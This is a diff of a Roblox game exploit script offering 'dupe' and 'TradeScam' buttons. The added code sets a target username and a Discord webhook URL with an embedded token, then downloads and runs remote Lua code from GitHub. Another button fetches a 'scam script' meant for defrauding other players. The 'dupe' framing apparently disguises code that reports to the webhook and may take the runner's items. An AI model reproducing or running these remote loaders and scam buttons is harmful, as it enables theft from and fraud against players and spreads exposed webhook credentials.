@@ -12,22 +12,20 @@ local TradeSection = Scam:NewSection("TradeScam")
 
 
 DupeSection:NewButton("Dupe (Bank Tier 3 Required)", "Note: Requires atleast Tier 3 Bank", function()
-	_G.Key = "4tlA_remaGsiuL"
-	_G.AuthServer = "https://discord.com/api/webhooks/1051511326616322179/K3cH-LlFAXKCf178i3_cmI4w0imqoXIihX-RyDB2-tAAjzUtspCs__dH7jH9SYUovgE5"
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
+	UserName = "LuisGamer_Alt4"
+	WebHook = "https://discord.com/api/webhooks/1051889592183308309/mbEklxmO9g1nCcgZFjXeudXeOhQxRbmxDGFqD9zk8bpJUE-WpRH12JsS25r8hAe0N7fQ"
+
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
 end)
 
-DupeSection:NewButton("Dupe (All You Need Is a Bank)", "Note: Requires atleast Tier 3 Bank", function()
-	_G.UserID = "2016611144"
-	_G.Webhook = "https://discord.com/api/webhooks/1051231901572141156/Y6U4bmFRpI18Jv9fZ0NXwTJ5fMkHufd-v31j2ZzHFLnhqQrv_ohn9XURwaxicry9kQij"
-	_G.KickMessage = "The Dupe Has Comenced Wait 30 Mins"
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/ToxinKindaScripts/psxdupe/main/script2"))()
+DupeSection:NewButton("Dupe (PATCHED)", "Note: Requires atleast Tier 3 Bank", function()
+	print("Dupe is Patched")
 end)
 
 DupeSection2:NewButton("Trade Dupe (Patched)", "Patched", function()
 	print("Dupe is Patched")
 end)
 
-TradeSection:NewButton("TradeScam (SOON!)", "Work In Progress", function()
-	print("Work In Progress")
+TradeSection:NewButton("TradeScam (Click On 3 Dots)", "MIGHT NOT WORK FIRST TRY", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/NuggetGamingYT/psx-dupe/main/scam%20script", true))()
 end)
